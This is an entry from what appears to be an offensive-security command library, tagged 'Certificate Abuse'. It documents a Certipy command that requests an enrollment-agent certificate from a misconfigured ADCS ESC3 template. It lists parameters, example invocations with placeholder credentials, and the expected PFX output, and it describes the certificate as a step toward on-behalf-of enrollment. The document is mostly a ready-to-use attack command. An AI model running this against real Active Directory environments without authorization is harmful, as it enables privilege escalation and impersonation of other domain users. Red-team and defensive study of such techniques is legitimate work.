---
id: 095958e5-b91b-4d84-a1f2-c3dfae6291b3
name: certipy-request-certificate-basic
type: command
executor: bash
data: >-
  certipy req '$_DOMAIN/$_USERNAME:$_PASSWORD@$_CA_SERVER' -ca '$_CA_NAME'
  -template '$_TEMPLATE'
output: null
created_at: '2023-04-06T03:56:05.820960+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ADCS
  - Certificate Abuse
verified: true
validated: true
---

# certipy-request-certificate-basic

## Command

```bash
certipy req '$_DOMAIN/$_USERNAME:$_PASSWORD@$_CA_SERVER' -ca '$_CA_NAME' -template '$_TEMPLATE'
```

## Description

This command uses Certipy to request a basic certificate from an ADCS Enrollment Agent Template, such as a misconfigured 'ESC3' template. It authenticates with domain user credentials and enrolls a certificate that can later be used for on-behalf-of requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | The domain name (e.g., corp.local) | Yes |
| $_USERNAME | The username for authentication | Yes |
| $_PASSWORD | The password for the user | Yes |
| $_CA_SERVER | FQDN of the Certificate Authority server (e.g., ca.corp.local) | Yes |
| -ca $_CA_NAME | Name of the CA (e.g., corp-CA) | Yes |
| -template $_TEMPLATE | The vulnerable template name (e.g., ESC3) | Yes |

## Examples

### Basic Usage

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
```

### Advanced Usage

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3' -debug
```

## Expected Output

[*] Saved certificate and private key to 'john.pfx'

This indicates successful enrollment, with the PFX file saved in the current directory for use in subsequent steps.

## Related

- [[procedures/Request-Certificate-on-Behalf-of-User-via-Misconfigured-Enrollment-Agent-Templates]]
- [[tools/Certipy]]
